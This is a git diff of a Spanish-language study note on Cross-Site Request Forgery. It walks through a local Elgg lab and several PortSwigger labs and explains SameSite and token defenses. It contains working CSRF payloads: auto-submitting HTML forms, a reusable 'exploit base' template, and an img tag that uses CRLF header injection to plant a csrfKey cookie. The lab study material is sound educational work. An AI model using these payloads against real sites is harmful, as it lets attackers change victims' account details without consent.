@@ -1,122 +1,178 @@
 ---
-aliases: ["CSRF"]
+aliases: ["CSRF", "XSRF", "Cross-Site Request Forgery", "Falsificación de Peticiones entre Sitios"]
 tags:
-  - hacking/web
-  - hacking/explotacion
-  - herramientas/burpsuite
-  - hacking/laboratorios
-estado: 🟢 Terminado
+  - sec/web
+  - sec/web/cliente
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Cross-Site Scripting XSS]]"
+  - "[[Clickjacking Ataques]]"
+  - "[[Vulnerabilidades CORS y Laboratorios]]"
+  - "[[Vulnerabilidades OAuth en PortSwigger Labs]]"
+  - "[[HTTP Host header attacks]]"
+  - "[[Session Puzzling Session Fixation y Session Variable Overloading]]"
+fuente: "https://portswigger.net/web-security/csrf"
 ---
 
 # Cross-Site Request Forgery (CSRF)
 
-El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.
+El **Cross-Site Request Forgery** (**CSRF**, pronúnciese "see-surf") es una vulnerabilidad en la que un atacante **engaña al navegador de la víctima** para que emita una petición HTTP **auténtica y autenticada** hacia un sitio que la víctima usa, ejecutando una acción no deseada en su nombre. El navegador adjunta las cookies de sesión automáticamente; el servidor ve una petición legítima; la víctima nunca supo que se envió.
 
-> [!info] ¿Cómo funciona un ataque CSRF?
-> En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.
-> 
-> Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.
-> 
-> El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.
+> [!info] Cómo funciona un ataque CSRF
+> El atacante lanza un recurso (una página, una imagen, un form autoenviado) que provoca una petición a `https://banco.com/transferir?destino=atacante&cantidad=1000`. Si la víctima tiene sesión abierta en `banco.com` y las cookies viajan con esa petición cross-site (o son aceptadas por el servidor sin más pruebas), la acción se ejecuta. La página del atacante **no lee la respuesta** (la SOP lo impide): el ataque es de **fuerza bruta de acciones**, no de lectura. Es por eso que acciones como transferencias, cambio de email o eliminación de cuentas son los targets clásicos.
+>
+> Ejemplo canónico: usuario con sesión en su banco visita una web maliciosa cuyo formulario envía `POST /transferir` al banco; con un `<script>document.forms[0].submit()</script>` la transferencia se ejecuta automáticamente si el usuario tiene la sesión activa.
 
-Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado (cuidado, ya que también se pueden realizar acciones con ellos).
+Para prevenir el CSRF, los desarrolladores deben implementar **tokens CSRF**, validación **SameSite**, validación **Origin/Referer** y separación de credenciales (ver prevención). Ojo: los propios tokens CSRF se pueden llegar a usar en contra del atacante… o a saltarse, como veremos.
 
 > [!tip] Tokens CSRF
-> Los tokens CSRF son valores secretos y únicos generados por el servidor e incrustados en los formularios HTML o en las cabeceras de las solicitudes. Cuando el usuario envía una solicitud, el servidor verifica que el token enviado coincide con el token esperado. Si no coinciden, la solicitud es rechazada, previniendo así el ataque CSRF. Es crucial que estos tokens sean únicos por sesión de usuario y que no sean predecibles.
+> Valores secretos y únicos generados por el servidor, incrustados en formularios (campo oculto) o cabeceras. Al recibir la petición, el servidor compara el token enviado con el esperado; si no coinciden, rechaza. La clave es que el atacante **no puede leer** el token de la víctima (SOP), por lo que no puede incluirlo en su petición falsificada. Deben ser únicos por sesión (o por petición) e impredecibles.
 
-Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:
+**Lab Setup** (laboratorio local de la clase, Elgg): [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
 
-- **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
+## Mecánica: qué necesita el servidor para caer
 
-## Notas de la Práctica
+Un servidor vulnerable confía en **una sola señal** para autorizar acciones: "las cookies de la sesión están presentes". No distingue de dónde nació la petición. Los prerrequisitos del ataque:
 
-En esta ocasión vamos a trabajar en una máquina donde nosotros ya tenemos credenciales válidas:
+| Requisito | Detalle | Contramedida correspondiente |
+|---|---|---|
+| Acción basada en cookies | La sesión vive en cookies (no en headers custom que el navegador no adjunta solo) | Tokens personalizados / cabeceras custom |
+| Sin token CSRF (o débil) | El servidor no verifica un secreto inaccesible al atacante | Token en el form + verificación server-side |
+| Cookies cross-site aceptadas | Sin `SameSite=Strict/Lax` (o con `None`), o endpoints que aceptan GET autenticado | `SameSite=Lax` por defecto |
+| Sin validación Origin/Referer | El servidor no comprueba el origen de la petición | Allowlist de orígenes |
+| Acción sin efectos irreversibles protegidos | Transferir, borrar, cambiar credenciales | Re-autenticación / step-up |
+
+### La semántica real de SameSite
+
+`SameSite` es hoy la primera línea de defensa y la que más confusión genera. Definiciones precisas:
+
+| Valor | Envío de cookies | Notas |
+|---|---|---|
+| `Strict` | Solo peticiones **mismo sitio** | Ni siquiera desde un enlace de otro sitio llegan las cookies; UX fría en links externos |
+| `Lax` | Mismo sitio + **navegaciones top-level GET** (click en `<a>`, `GET` de form) | Por defecto en Chrome/Firefox/Safari modernos; **NO** envía cookies en `POST` cross-site, ni en sub-recursos (`<img>`, `fetch`, `iframe` en general) |
+| `None` (+`Secure` obligatorio) | Siempre, incluido cross-site | Solo para flujos legítimamente cross-site (embeds, SSO) |
+| *(ausente, legacy)* | Como `None`-suave (Chrome lo trata como `Lax` por defecto desde 2020) | Navegadores viejos: envían cookies igual |
+
+> [!warning] Mismo sitio ≠ mismo origen
+> **Origen** = esquema + host + puerto. **Sitio** = host (dominio registrable + subdominios), ignorando esquema y puerto (hasta la corrección "schemeful same-site" que añadió el esquema). `https://app.ejemplo.com` y `https://evil.ejemplo.com` son **distintos orígenes** pero **mismo sitio**: `SameSite=Lax/Strict` no protege entre hermanos. Varios labs de abajo explotan exactamente eso.
+
+> [!tip] Tokens no son magia
+> Un token CSRF válido garantiza que la petición fue construida con información que solo el sitio (y la víctima) poseen. Pero si el token se puede **leer** (XSS, ver [[Cross-Site Scripting XSS]]), **predecir**, **fijar** (cookie de token aceptada por el servidor) o **omitir** sin que se verifique (validación condicional), la protección se cae. La mayoría de labs de abajo son variantes de "el token existe pero su verificación tiene un agujero".
+
+## Notas de la Práctica (lab local Elgg)
+
+Trabajamos en una máquina con credenciales válidas:
+
 ```bash
 alice:seedalice
 samy:seedsamy
 ```
 
-Con esto en mente, vamos a entrar con las credenciales de Alice:
+Entramos con las credenciales de Alice:
+
 ![[Pasted image 20250825191351.png]]
 
-Estamos en la cuenta de Alice.
+Estamos en la cuenta de Alice. Lo primero: interceptar la petición al cambiar el nombre para ver cómo se tramita:
 
-Lo primero que vamos a hacer es tratar de interceptar la petición cuando queremos cambiar el nombre para ver cómo se tramita esta petición:
 ![[Pasted image 20250825191652.png]]
 
-Vemos que tenemos allí los valores. Y además tenemos `__elgg_token` y `__elgg_ts` (timestamp), cada uno con un identificador.
+Vemos los valores y tenemos `__elgg_token` y `__elgg_ts` (timestamp), cada uno con un identificador.
 
 > [!info] `__elgg_token` y `__elgg_ts`
-> En el contexto de Elgg (la plataforma utilizada en este laboratorio), `__elgg_token` es el token CSRF principal, mientras que `__elgg_ts` es un *timestamp* que se utiliza para prevenir ataques de *replay* y asegurar que el token no sea demasiado antiguo. Ambos son componentes de la protección CSRF.
+> En Elgg, `__elgg_token` es el token CSRF principal y `__elgg_ts` es un timestamp anti-replay (evita tokens demasiado antiguos). Ambos forman parte de la protección CSRF.
 
-Para comenzar a testear el CSRF, vamos a cambiar a `GET` y en el *repeater* vamos a ver si los campos son realmente necesarios:
+Para testear, cambiamos a `GET` en Repeater y quitamos `__elgg_token` y `__elgg_ts` para ver si son necesarios:
 
 ![[Pasted image 20250825191942.png]]
-Ya la petición está en `GET` y vamos a comenzar quitando los `__elgg_token` y `__elgg_ts` y veamos si sin esto podemos cambiar el nombre:
 
 ![[Pasted image 20250825192055.png]]
 
 ![[Pasted image 20250825192115.png]]
 
-Vemos un `200 OK`, lo que es buena señal, y además si revisamos la web veríamos que efectivamente se cambió el nombre del usuario:
+`200 OK` — buena señal — y si revisamos la web veríamos que efectivamente se cambió el nombre del usuario:
 
 ![[Pasted image 20250825192203.png]]
 
-Esto nos indica que esos dos valores en realidad no sirven para nada y esto ya nos da indicios de un posible CSRF.
+Esos dos valores **no se validan** — indicios claros de CSRF.
 
-Lo que podemos intentar es modificando el valor de identificador y también el nombre para cambiar el nombre a otro usuario. En este caso, tratamos con Samy, donde su `id=59`:
+Intentamos además modificar el identificador para cambiar el nombre de otro usuario (Samy, `id=59`):
 
 ![[Pasted image 20250825192429.png]]
 
-Vemos que sale `200 OK`, pero si leemos un poco podremos observar que nos dice que no tenemos suficientes permisos y no se realizó el cambio.
+`200 OK`, pero la app responde que no tenemos permisos: el id sí se valida contra la sesión.
 
-Ahora, si revisamos, nosotros podemos enviar mensajes privados y en estos mensajes nosotros podemos insertar un mensaje privado de la siguiente manera:
+Ahora los mensajes privados: vemos si interpretan HTML:
 
 ![[Pasted image 20250825192914.png]]
 
-Lo que hacemos es ver si los mensajes interpretan valores HTML.
-
 ![[Pasted image 20250825193104.png]]
 
-Vemos que el `marquee` no se interpreta, pero el `h1` sí lo hace, por lo que el objetivo va a ser que, mediante un mensaje, cuando Alice lo abra, logremos cambiar su nombre de perfil de "Stark" a "Beater", por ejemplo. Y esto lo hacemos de la siguiente manera:
+El `marquee` no se interpreta pero el `h1` sí. Objetivo: que al abrir Alice el mensaje, se cambie su nombre de perfil a "Beater" mediante un form automático:
 
 ![[Pasted image 20250825193356.png]]
 
-Si al enviar lo que va a pasar es que a Alice, al no poder cargar la imagen, le saldrá una imagen rota representativa. Si no lo queremos, podemos hacer lo siguiente:
+Si la imagen no carga, Alice ve una imagen rota; para evitarlo:
+
 ![[Pasted image 20250825193552.png]]
 
-Ya esto lo podemos probar y ver si es que funcionó:
+Probamos y verificamos:
 
 ![[Pasted image 20250825193627.png]]
 
-Vemos que sí se logró cambiar solo por el simple hecho de no tener una seguridad robusta, como si funcionaran los tokens.
-
-De esta forma, nosotros podemos cambiar cualquier cosa, incluida la contraseña, aunque en esta web nos pide la contraseña antigua, por lo que podemos validar si es necesario el campo de contraseña antigua para realizar el cambio:
+Funcionó: el nombre cambió por el simple hecho de no validar los tokens. Del mismo modo se podría cambiar cualquier cosa, incluida la contraseña — probamos si `current_password` es obligatorio:
 
 ![[Pasted image 20250825194005.png]]
 
-Como vemos, ya capturamos la información y el proceso es el mismo, por lo que procedemos a cambiar el método de `POST` a `GET` y a eliminar el campo de `current_password` para ver si en verdad es necesario:
+Pasamos a `GET` y eliminamos `current_password`:
 
 ![[Pasted image 20250825194217.png]]
 
-Vemos que no, no nos deja, por lo que eso está bien validado.
+No: `current_password` sí está bien validado. El concepto, sin embargo, es el mismo para cualquier otro objetivo.
 
-Pero el concepto es el mismo para cualquier otro objetivo.
+## Catálogo de variantes de CSRF y sus payloads
+
+| Variante | Señal detectable | Payload/PoC clave |
+|---|---|---|
+| Sin defensas | Sin token, sin SameSite estricto | Form + `document.forms[0].submit()` |
+| Token omitible | `POST` sin campo `csrf` → 200/302 | Form sin el campo del token |
+| Validación depende del método | `GET` sin token funciona | Form `method=GET` |
+| Token no atado a sesión | Token de la cuenta A funciona en la B | Token fijo robado en el form |
+| Token atado a cookie no-sesión | `csrfKey` en cookie aceptada por inyección | `<img src="...?search=...%0d%0aSet-Cookie:...">` + form |
+| Token duplicado en cookie | Servidor compara `csrf` form == `csrf` cookie | Fijar ambos con el mismo valor vía CRLF |
+| SameSite=Lax | `POST` cross-site sin cookies | `GET` con method override `_method=POST` |
+| SameSite=Strict | Ni GET top-level lleva cookies | Redirect chain desde el propio origen |
+| Validación Referer "ausencia" | Petición sin `Referer` pasa | `<meta name="referrer" content="no-referrer">` |
+| Validación Referer "subcadena" | `Referer` que contiene el dominio pasa | `<meta name="referrer" content="unsafe-url">` + nombre de archivo = dominio |
+| OAuth/token refresh | Cookie recién emitida por el flujo SSO | `window.open(social-login)` + `setTimeout(submit)` |
+
+Exploit base reutilizable (cambia URL, método y campos):
+
+```html
+<form class="login-form" name="change-email-form"
+  action="https://VICTIMA/my-account/change-email" method="POST">
+  <input required="" type="email" name="email" value="pwned@hacked.com">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
 
 ## PortSwigger
 
 ### Lab: CSRF vulnerability with no defenses
 
-Vamos con el primer lab. El propósito es cambiar el correo de un usuario dentro de la web. En este caso, para esto primero tenemos que saber cómo se está produciendo la petición. Para esto, capturamos el momento en el cual se realiza el cambio:
+Objetivo: cambiar el correo de un usuario. Capturamos el momento del cambio:
 
 ![[Pasted image 20250911094446.png]]
 
-Podemos ver que la petición se realiza a la web de `/my-account/change-email` enviando el valor de `email` con el cuerpo de la petición.
+La petición va a `/my-account/change-email` con el valor `email` en el cuerpo. Un usuario con sesión activa debe enviar, desde nuestra web vulnerable, los valores de un formulario por `POST` autoenviado. El formulario lo sacamos de la misma web:
 
-Bueno, en este punto lo que vamos a hacer es que un usuario que ya se encuentra dentro con sus credenciales, mediante una web vulnerable, envíe por `POST` los valores de un formulario y se autoenvíe de forma automática. El formulario nosotros podemos sacarlo de la misma web:
 ![[Pasted image 20250911094839.png]]
 
-Lo sacamos, acomodamos y eliminamos elementos innecesarios que no son necesarios como el `button` y `label`, y modificamos el valor de `action` para que se envíe a la URL de forma estática, por decirlo así. Y vamos a agregar también etiquetas JavaScript para el envío automático del formulario de la siguiente manera:
+Limpiamos elementos innecesarios (`button`, `label`), fijamos `action` estático y agregamos el autoenvío:
 
 ```html
 <form class="login-form" name="change-email-form" action="https://0a9b008a03d8ec338143a2b400080084.web-security-academy.net/my-account/change-email" method="POST">
@@ -128,40 +184,42 @@ Lo sacamos, acomodamos y eliminamos elementos innecesarios que no son necesarios
 </script>
 ```
 
-Tenemos la forma automática de enviar un formulario con JavaScript y es seleccionándolo y enviándolo. Como el laboratorio es de PortSwigger, vamos a ver cómo queda en la parte de exploit:
+En el exploit server de PortSwigger:
+
 ![[Pasted image 20250911095725.png]]
 
-Si enviamos esto, vemos primero a ver si funciona. Nuestro correo actual es `test@test.com`:
+Probamos con el correo actual `test@test.com`:
+
 ![[Pasted image 20250911095632.png]]
-Vemos qué pasa:
 ![[Pasted image 20250911095748.png]]
 
-Cambió, por lo que en este punto podemos enviar el exploit para completar el lab:
+Cambió — enviamos el exploit para completar el lab:
+
 ![[Pasted image 20250911095854.png]]
 
 Lab Terminado.
 
 ### Lab: CSRF where token validation depends on request method
 
-En este lab vamos a ver cómo vulnerar cuando la validación del token depende del método de la petición.
+Interceptamos el cambio de correo:
 
-Vamos a comenzar interceptando la petición cuando se intenta hacer el cambio de correo:
 ![[Pasted image 20250911101856.png]]
-Vemos que en este caso no solo se tramita el valor del correo, sino un `csrf` que es un token de seguridad.
 
-Algo que nosotros tenemos que intentar validar es primero si el campo es necesario. Si lo eliminamos y nos permite continuar, en este caso sí lo es. Otra cosa común que suele suceder es que las peticiones se admiten también por otro método. En este caso, si lo pasamos a `GET`, vemos qué sucede:
+Además del correo se tramita un token `csrf`. Primero: si lo eliminamos, ¿pasa? No — el token hace falta. Otra prueba común: cambiar el método a `GET`:
 
 ![[Pasted image 20250911103151.png]]
 
-Vemos que sí es válido. Recordemos que los códigos de estado `300` suelen asociarse a redirecciones, mas no a errores, por lo que podemos tomarlo como correcto y saldrá correcto al darle a `follow redirection`.
+Válido (los códigos 3xx son redirecciones, no errores; *follow redirection*):
+
 ![[Pasted image 20250911103311.png]]
 
-En este punto, algo que podemos validar es otra vez si es necesario el campo de `csrf`:
+Si en `GET` el token ya no hace falta:
 
 ![[Pasted image 20250911103405.png]]
 ![[Pasted image 20250911103421.png]]
 
-Se tramitó sin problemas sin necesitar el campo de `csrf`, por lo que con esto en mente, tenemos que crear la web maliciosa de la siguiente manera:
+Web maliciosa con método `GET`:
+
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0a9400f6046b1e2d81ce76d9001100de.web-security-academy.net/my-account/change-email" method="GET">
@@ -173,22 +231,23 @@ Se tramitó sin problemas sin necesitar el campo de `csrf`, por lo que con esto 
 </script>
 ```
 
-Perfecto, la estructura del login es de igual forma sacada de la web y cambiamos el `action` para apuntar exactamente a lo que queremos. Además, cambiamos el método para que se ejecute por `GET`. Con esto, vamos a configurarlo en la página de exploit:
-
 ![[Pasted image 20250911104039.png]]
 
-Y esto funciona, por lo que veremos:
 ![[Pasted image 20250911104108.png]]
 Lab Terminado.
 
 ### Lab: CSRF where token validation depends on token being present
 
-En este lab solo se realizará la validación cuando tenemos presente un token. Si no lo tiene, la petición pasa:
+La validación solo ocurre cuando el token está presente: si no lo tiene, la petición pasa:
+
 ![[Pasted image 20250911104547.png]]
 
-Vemos, al igual que en el anterior, la petición, pero ahora vamos a volver a intentar ver qué pasa cuando eliminamos el parámetro de `csrf`:
+Eliminamos el parámetro `csrf`:
+
 ![[Pasted image 20250911104701.png]]
-Genial, pues nos deja pasar. Con esto en mente, creemos el código de la web maliciosa:
+
+Pasa. Web maliciosa sin el campo token:
+
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0af700c9046c20e798d940e500cd00a2.web-security-academy.net/my-account/change-email" method="POST">
@@ -200,23 +259,19 @@ Genial, pues nos deja pasar. Con esto en mente, creemos el código de la web mal
 </script>
 ```
 
-En el apartado de exploit se vería de la siguiente manera:
 ![[Pasted image 20250911105039.png]]
 
-Enviamos y ya resolveríamos el laboratorio:
 ![[Pasted image 20250911105126.png]]
-
 Lab Terminado.
 
 ### Lab: CSRF where token is not tied to user session
 
-En este laboratorio ya se está empleando el `CSRF` de un solo uso, lo que ya no permite que atacantes puedan reutilizarlo para enviar otras peticiones malintencionadas.
-
-Ahora, esto tiene que estar bien configurado y que los tokens generados sean asociados a las cuentas que los usan. La razón es sencilla: si logramos generar un `CSRF` y no lo usamos, este queda activo. Ahora, si este no está asociado a la cuenta que lo generó, lo que sucede es que podemos usarlos en otras cuentas, y este es el caso de esta máquina y la razón por la que nos dan dos usuarios. Vamos a obtener un `CSRF` válido de la cuenta de `wiener`:
+Se emplea CSRF de un solo uso, pero mal configurado: los tokens no se asocian a la cuenta que los genera, así que un token generado por una cuenta puede usarse en otra. Nos dan dos usuarios. Obtenemos un CSRF válido de la cuenta `wiener`:
 
 ![[Pasted image 20250911111656.png]]
 
-No permitimos que la petición se envíe. Ahora, vamos a crear el archivo HTML malicioso con este token, que debería funcionar:
+No permitimos que la petición se envíe. Creamos el HTML malicioso con ese token:
+
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0add00be0470395e81f7de0100c900a0.web-security-academy.net/my-account/change-email" method="POST">
@@ -229,63 +284,66 @@ No permitimos que la petición se envíe. Ahora, vamos a crear el archivo HTML m
 </script>
 ```
 
-Ya tenemos listo el código con el token y el autoenvío, además del token válido insertado. En el exploit se vería así:
 ![[Pasted image 20250911112217.png]]
-Enviemos; esto debería funcionar:
 
 ![[Pasted image 20250911112355.png]]
 Lab Terminado.
 
 ### Lab: CSRF where token is tied to non-session cookie
 
-Bueno, al igual que en el laboratorio anterior, vamos a tener dos usuarios con los cuales vamos a estar realizando las pruebas. En este caso, vamos a tener uno en Firefox y otro corriendo en el Chromium de Burp Suite:
+Dos usuarios: uno en Firefox y otro en el Chromium de Burp:
+
 ![[Pasted image 20250911121735.png]]
 ![[Pasted image 20250911121747.png]]
 
-Bueno, vamos a capturar la petición de igual forma de alguno de los dos al momento de cambiar el correo. Con esto podemos intentar ver cómo se tramita y qué es lo que usa:
+Capturamos la petición de cambio de correo de cada uno para comparar cómo se tramita.
+
 Wiener:
 ![[Pasted image 20250911122008.png]]
 Carlos:
 ![[Pasted image 20250911122142.png]]
 
-Perfecto, vemos cómo se están tramitando las peticiones en dos cuentas y esto ayuda en realidad mucho, ya que vemos cosas como que el `csrf` cambia, pero algo que llama la atención es que en el primero de Wiener yo realicé una búsqueda y luego intenté cambiar el nombre, y al parecer arrastró un campo de `search`. A diferencia de Carlos, donde no realicé búsquedas, podemos ver que efectivamente no se está arrastrando nada.
-
-Revisando y por medio de prueba, determinamos que en este caso el `csrf` no es de un solo uso, por lo que se puede reutilizar múltiples veces para cambiar los emails. No podemos eliminar los campos y tampoco realizar cambio de método; ambos `CSRF` son validados y necesarios. Se usó un `csrf` en el otro usuario y vimos que no es válido. Puede que ya tengan algún tipo de vínculo con la cuenta. Esto si solo cambiamos uno de los dos, pero si usamos el `csrf` y `csrfKey` de Carlos en Wiener, funciona, lo que me llama la atención de que ambos campos tienen algún vínculo al ser verificados:
+Comparando: el `csrf` cambia entre usuarios; el de Wiener arrastra un campo `search` (porque él hizo búsquedas) y el de Carlos no. Probamos: el `csrf` **no** es de un solo uso (se reutiliza); no podemos eliminar campos ni cambiar método; un `csrf` de un usuario no vale en el otro. Pero usando el `csrf` **y** el `csrfKey` (cookie) de Carlos en Wiener, funciona:
 
 ![[Pasted image 20250911123108.png]]
 
-Analicemos: el `csrf` tramitado en el formulario nosotros lo podemos pasar sin ningún problema y poner uno válido que sea el nuestro mismo, pero el `csrfKey` que se almacena en la Cookie es diferente y también necesitamos cambiarla, pero para esto necesitamos alguna forma de hacerlo.
+Análisis: el `csrf` del formulario podemos ponerlo nosotros, pero el `csrfKey` está en la Cookie y también necesita cambiar — necesitamos una forma de fijar cookies del dominio víctima. La hallamos en la búsqueda: al hacer una búsqueda se usa `lastSearchTerm` en la cookie, y en `Set-Cookie` de la respuesta se refleja. ¿Es inyectable?
 
-En este punto tenemos algo fundamental y es cómo se están tramitando las búsquedas. Vamos a capturar una y ver más a detalle cómo se están tramitando:
 ![[Pasted image 20250911123707.png]]
-Vemos algo no usual y es que se usa un campo en la cookie llamado `lastSearchTerm` con el valor que le pasamos en la búsqueda. Además, en la respuesta, en `Set-Cookie`, vemos lo mismo, lo que hace `Set-Cookie` es, por decirlo de alguna manera, establecer esa cookie con su valor para una futura búsqueda. Ahora lo que vamos a verificar es si ese campo es inyectable, donde podamos insertar ciertos comandos:
+
 ![[Pasted image 20250911124418.png]]
-Perfecto, podemos observar que sí tenemos posibilidad de inyectar datos:
+
 ![[Pasted image 20250911124945.png]]
-Vemos que sí podemos, pero el hecho de que no tome los colores es algo preocupante, por lo que vamos a intentar modificar de esta manera una petición nueva y luego ver su respuesta:
+
+Podemos inyectar, pero no interpreta colores (no se refleja el HTML en la respuesta). Intentamos modificar una petición nueva:
 
 ![[Pasted image 20250911125108.png]]
 ![[Pasted image 20250911125303.png]]
-Perfecto, ahora intentemos ver una nueva solicitud a ver qué nos está arrastrando:
-![[Pasted image 20250911125343.png]]
-Vemos que no se cambió el valor de `csrfKey`; esto ya me indica que no se está interpretando la inyección.
 
-Algo más que podemos intentar es ver si podemos inyectar otro parámetro del mismo estilo `Set-Cookie`:
+En una nueva solicitud, a ver qué nos está arrastrando:
+
+![[Pasted image 20250911125343.png]]
+
+`csrfKey` no cambia en peticiones nuevas: la inyección no se interpreta. Probamos inyectar otro parámetro estilo `Set-Cookie`:
+
 ![[Pasted image 20250911125628.png]]
-Logramos inyectar otro `Set-Cookie`, pero necesitamos obligatoriamente hacer un salto de línea para que se interprete. Nosotros podríamos tratar de hacer es revisar el manual de ASCII y determinar cómo se puede insertar un retorno de carro (`\r`) y una nueva línea (`\n`):
+
+Logramos inyectar otro `Set-Cookie`, pero necesitamos un salto de línea para que se interprete como cabecera nueva. Revisamos ASCII para insertar retorno de carro (`\r`) y nueva línea (`\n`):
+
 ![[Pasted image 20250911125939.png]]
 
-Perfecto, podemos ayudarnos del decodificador de Burp Suite para ver cómo va quedando nuestra cadena de la siguiente manera:
-![[Pasted image 20250911130056.png]]
-Vemos que está bastante bien, podemos intentar con esto a ver qué logramos:
-![[Pasted image 20250911130155.png]]
-Es de locos y esto funciona. Ahora podemos ver que los colores dan a entender que sí se está interpretando, así que podemos intentar esto igual que antes y ver si en nuevas peticiones logramos un cambio:
-![[Pasted image 20250911130416.png]]
-Veamos en una nueva petición:
-![[Pasted image 20250911130450.png]]
-Lo cambiamos, ya con esto estamos listos. Ahora lo que vamos a intentar es crear una estructura en HTML con la cual primero vamos a cargar una búsqueda en la web para primero cambiar el `csrfKey` y luego de esto enviar el formulario, entonces vamos a aplicar algo de conocimientos para esta ocasión.
+Con el decodificador de Burp verificamos la cadena:
 
-Veamos cómo nos queda el código y lo explicamos luego:
+![[Pasted image 20250911130056.png]]
+
+Funciona — ahora vemos los colores interpretados y en una petición nueva vemos el cambio:
+
+![[Pasted image 20250911130155.png]]
+![[Pasted image 20250911130416.png]]
+![[Pasted image 20250911130450.png]]
+
+Armamos la estructura HTML: primero cargar la búsqueda que cambia `csrfKey`, luego enviar el formulario:
+
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0ae90019046635d9819feded0086004b.web-security-academy.net/my-account/change-email" method="POST">
@@ -298,33 +356,32 @@ Veamos cómo nos queda el código y lo explicamos luego:
   onerror="document.forms[0].submit();">
 ```
 
-Vamos a ver, primero configuramos el formulario con el link y el `csrf` correspondiente. Ahora, el formulario aún no se envía, solo se define. Lo primero que intentará cargarse es la imagen, la cual contiene el link con la petición maliciosa al buscador donde se cambiará el valor de `csrfKey` para que concuerde con el `csrf` del formulario y pueda ejecutarse. También se implementó `SameSite=None`, un parámetro que nos permite enviar cookies entre sitios web. Es muy importante, ya que, al ser nuestro un sitio web malicioso, es necesario que se active en la víctima para que las cookies que enviamos desde nuestra web puedan insertarse. Por último, el error que produciría la etiqueta `img` al no poder cargar una imagen, y lo controlamos para que, al producirse, envíe el formulario.
+Explicación: el formulario define el `csrf` correcto; la `img` dispara primero la búsqueda con inyección CRLF que fija `csrfKey` (con `SameSite=None` para que viaje); al fallar la carga de la imagen, `onerror` envía el formulario.
 
 > [!info] Atributo `SameSite` en Cookies
-> El atributo `SameSite` en las cookies es una medida de seguridad que ayuda a mitigar los ataques CSRF. Define cuándo se deben enviar las cookies con las solicitudes de origen cruzado.
-> - `Strict`: Las cookies solo se envían en solicitudes de mismo sitio. No se envían en solicitudes de origen cruzado, incluso al hacer clic en un enlace.
-> - `Lax`: Las cookies se envían en solicitudes de mismo sitio y en solicitudes de origen cruzado si son navegaciones de nivel superior (como un enlace `<a>` o `GET` de un formulario) y el método HTTP es `GET`. No se envían en solicitudes `POST` de origen cruzado.
-> - `None`: Las cookies se envían en todas las solicitudes, tanto de mismo sitio como de origen cruzado, siempre que se use el atributo `Secure`. Requiere `Secure` para funcionar.
-> 
-> En este laboratorio, la inyección de `SameSite=None` en la cookie `csrfKey` es crucial para que la cookie pueda ser enviada desde el sitio del atacante al sitio vulnerable, permitiendo así el bypass de la protección.
+> - `Strict`: solo mismo sitio, nunca cross-site.
+> - `Lax`: mismo sitio + navegaciones top-level `GET`.
+> - `None`: todas las peticiones, requiere `Secure`.
+> Inyectar `SameSite=None` en `csrfKey` es crucial para que la cookie fijada viaje desde el sitio atacante.
 
-Veamos en el exploit para ver cómo nos queda:
 ![[Pasted image 20250911134449.png]]
-Ahora sí, veamos si funciona:
+
 ![[Pasted image 20250911134500.png]]
 Lab Terminado.
 
 ### CSRF con token duplicado en cookie
 
-Al parecer, tenemos el token duplicado en la cookie, por lo que entiendo, y esto, en sí, no tiene seguridad, pero vamos a ver cómo está hecho para comprenderlo mejor:
+Tenemos el token duplicado en cookie y formulario:
 
 ![[Pasted image 20250911135402.png]]
-Vemos que tenemos el token duplicado y esto seguridad no tiene por ningún lado. Sería transportar el mismo concepto del Lab anterior y modificar los dos campos.
-![[Pasted image 20250911135501.png]]
-Revisando un poco, vemos que no se verifica que sea un token válido, sino que solo se verifica si los dos son iguales, por lo tanto, esto es muy malo, así que vamos a crear algo similar a lo anterior, viendo si de alguna manera `search` tiene la misma vulnerabilidad.
 
+El servidor no verifica un token válido contra el de sesión — solo comprueba que **los dos campos sean iguales**. Revisamos si `search` tiene la misma inyección:
+
+![[Pasted image 20250911135501.png]]
 ![[Pasted image 20250911135800.png]]
-Vemos que sí es lo mismo y solo vamos a modificar un poco el código, quedando de la siguiente manera:
+
+Mismo concepto del lab anterior con valor arbitrario igual en ambos campos:
+
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0ae6003c04fa057880f7032a009b003a.web-security-academy.net/my-account/change-email" method="POST">
@@ -337,99 +394,109 @@ Vemos que sí es lo mismo y solo vamos a modificar un poco el código, quedando 
   onerror="document.forms[0].submit();">
 ```
 
-Como vemos, es el mismo concepto anterior con el cambio de que podemos poner cualquier cosa en el `csrf` y `csrfKey` siempre y cuando sean iguales. Vemos en exploit:
 ![[Pasted image 20250911140703.png]]
 
-Vemos si funciona:
 ![[Pasted image 20250911140724.png]]
-
 Lab Terminado.
 
 ### Lab: SameSite Lax bypass via method override
 
